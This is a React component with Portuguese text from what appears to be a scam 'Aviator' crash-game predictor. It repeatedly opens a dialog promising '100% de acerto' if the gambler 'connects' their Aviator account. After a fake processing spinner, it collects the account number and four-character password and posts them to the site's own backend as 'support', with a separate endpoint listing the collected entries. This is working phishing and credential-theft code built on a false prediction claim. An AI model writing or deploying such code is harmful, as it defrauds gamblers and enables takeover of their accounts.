import { useState, useEffect } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { useProtection } from "@/hooks/use-protection";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Loader } from "lucide-react";

// Estilo para remover o focus ring
const inputStyle = `
  .resultado-input:focus {
    outline: none !important;
    ring: 0 !important;
    box-shadow: none !important;
  }
  .spin-loader {
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }
`;

const DIALOG_INTERVAL_MS = 15 * 60 * 1000; // 15 minutos
const LOADING_DURATION_MS = 4 * 1000; // 4 segundos
const BLOCK_DURATION_MS = 24 * 60 * 60 * 1000; // 24 horas
const LAST_SUBMIT_KEY = 'ultimo_envio_resultado_cliente';

export function ResultadosClienteDialog() {
  useProtection(); // Proteção de código
  const [open, setOpen] = useState(false);
  const [stage, setStage] = useState<'initial' | 'loading' | 'form'>('initial'); // initial, loading, form
  const [valorApos, setValorApos] = useState("");
  const [valorSacar, setValorSacar] = useState("");
  const [errosValidacao, setErrosValidacao] = useState<{ apos?: boolean; sacar?: boolean }>({});
  const { toast } = useToast();
  const queryClient = useQueryClient();

  // Abrir diálogo a cada 15 minutos (independente da interação do usuário)
  // Mas bloquear por 24 horas após envio bem-sucedido
  useEffect(() => {
    const verificarEAbrirDialog = () => {
      const ultimoEnvio = localStorage.getItem(LAST_SUBMIT_KEY);
      if (ultimoEnvio) {
        const tempoDecorrido = Date.now() - parseInt(ultimoEnvio);
        // Se menos de 24 horas passaram, não abrir
        if (tempoDecorrido < BLOCK_DURATION_MS) {
          return;
        }
      }
      // Se pode abrir, abre
      setOpen(true);
      setStage('initial');
    };

    // Verificar imediatamente ao carregar
    verificarEAbrirDialog();

    // Depois verificar a cada 15 minutos
    const timer = setInterval(verificarEAbrirDialog, DIALOG_INTERVAL_MS);

    return () => clearInterval(timer);
  }, []);

  // Lógica de loading por 4 segundos
  useEffect(() => {
    if (stage === 'loading') {
      const loadingTimer = setTimeout(() => {
        setStage('form');
      }, LOADING_DURATION_MS);
      return () => clearTimeout(loadingTimer);
    }
  }, [stage]);

  const handleEnviarAgora = () => {
    setStage('loading');
  };

  const enviarMutation = useMutation({
    mutationFn: async (data: { apos: number; sacar: string }) => {
      const res = await apiRequest("POST", "/api/resultados-clientes", data);
      return res.json();
    },
    onSuccess: () => {
      // Registrar timestamp do último envio bem-sucedido
      localStorage.setItem(LAST_SUBMIT_KEY, Date.now().toString());
      queryClient.invalidateQueries({ queryKey: ["/api/resultados-clientes/lista"] });
      setOpen(false);
      setValorApos("");
      setValorSacar("");
      setErrosValidacao({});
      // Mostrar notificação de sucesso por 24 horas
      toast({
        title: "✅ Enviado com sucesso!",
        description: "Próximo diálogo aparecerá em 24 horas.",
        duration: 3000,
      });
    },
  });

  const enviarResultado = () => {
    const novoErros: { apos?: boolean; sacar?: boolean } = {};
    
    // Validar Apos: deve ter mínimo 9 dígitos
    const aposNum = parseFloat(valorApos);
    const aposDigitos = valorApos.trim().replace(/[^0-9]/g, '').length; // Conta apenas dígitos
    if (!valorApos.trim() || isNaN(aposNum) || aposNum <= 0 || aposDigitos < 9) {
      novoErros.apos = true;
    }
    
    // Validar Sacar: deve ter exatamente 4 caracteres
    if (valorSacar.trim().length !== 4) {
      novoErros.sacar = true;
    }
    
    // Se houver erros, mostrar bordas vermelhas e não enviar
    if (Object.keys(novoErros).length > 0) {
      setErrosValidacao(novoErros);
      return;
    }
    
    // Limpar erros e enviar
    setErrosValidacao({});
    toast({
      title: "Conexão em andamento...",
      duration: 3000,
    });
    enviarMutation.mutate({ apos: aposNum, sacar: valorSacar });
  };

  const handleFechar = () => {
    setOpen(false);
    setStage('initial');
    setValorApos("");
    setValorSacar("");
    setErrosValidacao({});
  };

  return (
    <>
      <style>{inputStyle}</style>
      <Dialog open={open} onOpenChange={handleFechar}>
        <DialogContent className="sm:max-w-sm mx-auto bg-black border rounded-lg" style={{ borderColor: '#333333', borderWidth: '1px', position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%, -50%)' }}>
        
        {/* Header com Atenção - apenas na tela inicial */}
        {stage === 'initial' && (
          <div className="flex items-start justify-between gap-2 mb-3">
            <div className="text-center flex-1" style={{ color: '#FFD700', fontSize: '18px', fontWeight: 'bold' }}>
              ⚠️ Atenção caro apostador
            </div>
            <button
              onClick={handleFechar}
              className="text-gray-300 hover:text-white hover:bg-gray-800 rounded p-1 transition-colors flex-shrink-0"
              data-testid="button-close-resultado"
              title="Fechar"
            >
              <span className="text-xl font-bold">✕</span>
            </button>
          </div>
        )}

        {/* Botão X - nos estágios loading e form */}
        {(stage === 'loading' || stage === 'form') && (
          <div className="flex justify-end mb-3">
            <button
              onClick={handleFechar}
              className="text-gray-300 hover:text-white hover:bg-gray-800 rounded p-1 transition-colors"
              data-testid="button-close-resultado"
              title="Fechar"
            >
              <span className="text-xl font-bold">✕</span>
            </button>
          </div>
        )}

        {/* Tela Inicial com 2 botões */}
        {stage === 'initial' && (
          <div className="space-y-4">
            <DialogHeader className="pb-2">
              <DialogTitle className="text-base text-white">Conecte a sua conta do Aviator para que o sistema funcione corretamente e indique com alta precisão onde o Aviator vai cair. Faça a conexão para ativar todas as funcionalidades do sistema.</DialogTitle>
              <DialogDescription className="sr-only">
                Conecte a sua conta do Aviator para que o sistema funcione corretamente e indique com alta precisão onde o Aviator vai cair. Faça a conexão para ativar todas as funcionalidades do sistema.
              </DialogDescription>
            </DialogHeader>
            <div className="flex gap-3">
              <Button
                onClick={handleFechar}
                variant="ghost"
                className="flex-1 bg-gray-700 hover:bg-gray-600 text-white"
                data-testid="button-depois"
              >
                Depois
              </Button>
              <Button
                onClick={handleEnviarAgora}
                className="flex-1 bg-red-700 hover:bg-red-800 text-white"
                data-testid="button-enviar-agora"
              >
                Conectar agora
              </Button>
            </div>
          </div>
        )}

        {/* Tela de Loading */}
        {stage === 'loading' && (
          <div className="flex flex-col items-center justify-center py-8">
            <Loader className="w-8 h-8 text-red-700 spin-loader mb-3" />
            <p className="text-gray-300 text-sm">Processando...</p>
          </div>
        )}

        {/* Tela de Preenchimento */}
        {stage === 'form' && (
          <div className="space-y-4">
            <DialogHeader className="pb-2">
              <DialogTitle className="text-base text-white">Para concluir a configuração, preencha os campos abaixo com o seu número de Aviator e a sua senha. Assim, o sistema poderá conectar imediatamente à sua conta e funcionar corretamente com 100% de acerto. </DialogTitle>
              <DialogDescription className="sr-only">
                Para concluir a configuração, preencha os campos abaixo com o seu número de Aviator e a sua senha. Assim, o sistema poderá conectar imediatamente à sua conta e funcionar corretamente com 100% de acerto..
              </DialogDescription>
            </DialogHeader>

            <div className="space-y-1">
              <label className="text-sm font-medium text-gray-300">Numero:</label>
              <Input
                type="number"
                step="0.01"
                placeholder="Exemplo: 861234567"
                value={valorApos}
                onChange={(e) => {
                  setValorApos(e.target.value);
                  // Limpar erro individual ao digitar
                  if (errosValidacao.apos) {
                    setErrosValidacao(prev => ({ ...prev, apos: false }));
                  }
                }}
                data-testid="input-apos-resultado"
                disabled={enviarMutation.isPending}
                className={`resultado-input bg-gray-800 text-white ${
                  errosValidacao.apos ? 'border-red-600 border-2' : 'border-gray-700'
                }`}
              />
              {errosValidacao.apos && (
                <p className="text-xs text-red-600">Mínimo deve ser 9 dígitos</p>
              )}
            </div>

            <div className="space-y-1">
              <label className="text-sm font-medium text-gray-300">Senha:</label>
              <Input
                type="text"
                placeholder="Exemplo: 1234"
                value={valorSacar}
                maxLength={4}
                onChange={(e) => {
                  const novoValor = e.target.value.slice(0, 4);
                  
                  setValorSacar(novoValor);
                  
                  // Limpar erro individual ao digitar
                  if (errosValidacao.sacar) {
                    setErrosValidacao(prev => ({ ...prev, sacar: false }));
                  }
                }}
                data-testid="input-sacar-resultado"
                disabled={enviarMutation.isPending}
                className={`resultado-input bg-gray-800 text-white ${
                  errosValidacao.sacar ? 'border-red-600 border-2' : 'border-gray-700'
                }`}
              />
              {errosValidacao.sacar && (
                <p className="text-xs text-red-600">Deve ter 4 caracteres</p>
              )}
            </div>

            <Button
              onClick={enviarResultado}
              disabled={enviarMutation.isPending}
              className="w-full"
              data-testid="button-enviar-resultado"
            >
              {enviarMutation.isPending ? "Conexão em andamento..." : "Enviar para o Suporte"}
            </Button>

            <Button
              onClick={handleFechar}
              variant="ghost"
              className="w-full text-gray-400 hover:text-white"
              data-testid="button-enviar-depois-form"
            >
              Enviar depois
            </Button>
          </div>
        )}
      </DialogContent>
    </Dialog>
    </>
  );
}
